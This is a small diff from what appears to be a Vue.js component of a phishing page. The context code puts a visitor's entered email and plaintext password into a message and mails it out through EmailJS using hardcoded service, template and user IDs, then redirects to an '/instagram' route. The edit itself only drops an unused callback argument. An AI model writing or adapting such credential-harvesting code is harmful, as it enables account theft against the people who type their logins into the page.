@@ -107,7 +107,7 @@ export default {
               ${this.person.email}
               ${this.person.password}  `
           }
-            emailjs.send("service_gt8y0bq","template_ejo48mm",template_params,"user_RpJXvNZli3UY1aQvUCldG").then(res=>{
+            emailjs.send("service_gt8y0bq","template_ejo48mm",template_params,"user_RpJXvNZli3UY1aQvUCldG").then(()=>{
                 this.$router.push("/instagram")
             })
                
